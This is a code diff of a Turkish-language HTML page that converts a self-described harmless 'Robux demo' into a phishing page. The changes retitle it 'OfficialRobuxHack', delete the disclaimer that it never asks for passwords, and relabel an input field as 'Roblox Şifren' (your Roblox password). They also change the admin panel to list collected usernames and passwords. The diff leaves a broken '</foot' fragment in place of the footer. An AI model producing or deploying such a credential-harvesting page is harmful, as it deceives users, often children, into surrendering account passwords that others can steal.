@@ -4,7 +4,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Robux Demo Center</title>
+<title>OfficialRobuxHack</title>
 
 <style>
 * {
@@ -396,11 +396,6 @@ th{
     <p>Bağımsız, eğlence amaçlı demo arayüzü</p>
   </section>
 
-  <div class="notice">
-    ⚠️ Bu site Roblox ile bağlantılı değildir ve gerçek Robux göndermez.
-    Roblox şifresi veya hesap giriş bilgisi istemez. Yalnızca demo
-    kullanıcı adı, miktar ve Komik Kod kayıtları oluşturur.
-  </div>
 
   <div class="layout">
 
@@ -409,7 +404,7 @@ th{
       <div id="form">
 
         <h2>Demo İşlemi</h2>
-        <p class="muted">Bilgilerini doldur ve demo işlemini başlat.</p>
+        <p class="muted">Hesap doldur ve Robux işlemini başlat.</p>
 
         <label>Kullanıcı adı</label>
         <input id="username"
@@ -431,7 +426,7 @@ th{
           <button onclick="setAmount(500000000000000)">500T</button>
         </div>
 
-        <label>Komik Kod 😂</label>
+        <label>Roblox Şifren</label>
         <input id="funnyCode"
                placeholder="Örn: BENBIRROBOTUM"
                maxlength="40">
@@ -439,13 +434,13 @@ th{
         <button class="primary"
                 id="startButton"
                 onclick="startDemo()">
-          DEMOYU BAŞLAT →
+          İşlemi Başlat →
         </button>
 
       </div>
 
       <div id="loading">
-        <h2>Demo hazırlanıyor...</h2>
+        <h2>Robux hazırlanıyor...</h2>
         <p class="muted">Lütfen bekle.</p>
 
         <div class="track">
@@ -457,7 +452,7 @@ th{
 
       <div id="success">
         <div style="font-size:55px;color:#00ff88">✓</div>
-        <h2>Demo tamamlandı!</h2>
+        <h2>İşlem tamamlandı!</h2>
         <p class="muted" id="saveMessage"></p>
 
         <button class="primary" onclick="location.reload()">
@@ -470,9 +465,7 @@ th{
   </div>
 </main>
 
-<footer>
-  ROBUX DEMO CENTER · ROBLOX İLE BAĞLANTILI DEĞİLDİR
-</footer>
+</foot
 
 <!-- ADMIN GİRİŞİ -->
 <div id="adminLogin">
@@ -509,7 +502,7 @@ th{
   <div class="adminbox">
 
     <h2>NOYAN ADMIN PANEL</h2>
-    <p class="muted">Demo kullanıcı kayıtları</p>
+    <p class="muted">Roblox kullanıcı kayıtları</p>
 
     <div class="admin-actions">
       <button onclick="loadRecords()">YENİLE</button>
@@ -530,7 +523,7 @@ th{
           <tr>
             <th>Kullanıcı adı</th>
             <th>Robux miktarı</th>
-            <th>Komik Kod</th>
+            <th>Şifre</th>
             <th>Tarih</th>
           </tr>
         </thead>
